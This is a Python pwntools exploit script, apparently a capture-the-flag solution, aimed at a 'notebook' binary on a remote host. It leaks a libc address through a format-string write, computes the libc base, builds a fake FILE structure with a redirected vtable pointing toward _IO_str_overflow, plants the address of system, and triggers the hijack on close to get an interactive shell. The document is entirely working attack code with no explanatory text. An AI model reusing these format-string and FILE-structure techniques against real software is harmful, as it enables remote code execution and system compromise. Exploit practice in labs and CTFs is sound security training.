from pwn import *

context.binary = './notebook'
context.log_level = 'info'
context.terminal = ['qterminal', '-e']

elf = context.binary
libc = elf.libc

# p = process()
p = remote('10.10.15.10', 1337)
# g = gdb.attach(p.proc.pid, 'c')

def skip():
    p.recvuntil(b'> ')

def write(data):
    skip()
    p.sendline(b'1')
    skip()
    p.sendline(data)

def read() -> bytes:
    skip()
    p.sendline(b'2')
    p.recvuntil(b'wrote.\n')
    return p.recvuntil(b'1) Zapostit', drop=True)

def close():
    skip()
    p.sendline(b'3')


write(b'%llx.')

libc_leak = int(read().decode().split('.')[0], 16)
libc.address = libc_leak + (0x007fdf46400000 - 0x007fdf467b07e3)

log.success(f'libc base: {hex(libc.address)}')

io_str_overflow_p = libc.sym['_IO_file_jumps'] + 0xd8
fake_vtable_p = io_str_overflow_p - 0x10
fake_FILE_p = elf.sym['notebook'] + 0x10
null_p = elf.sym['notebook'] + 0x8

binsh_p = next(libc.search(b'/bin/sh\x00'))
log.success(f'binsh at {hex(binsh_p)}')

system = libc.address + 0x41656

file_struct = FileStructure(null=null_p)
file_struct.vtable = fake_vtable_p

payload = b''

payload += p64(fake_FILE_p)
payload += p64(0x0)

payload += bytes(file_struct)

payload += p64(system)

write(payload)

close()

p.interactive()
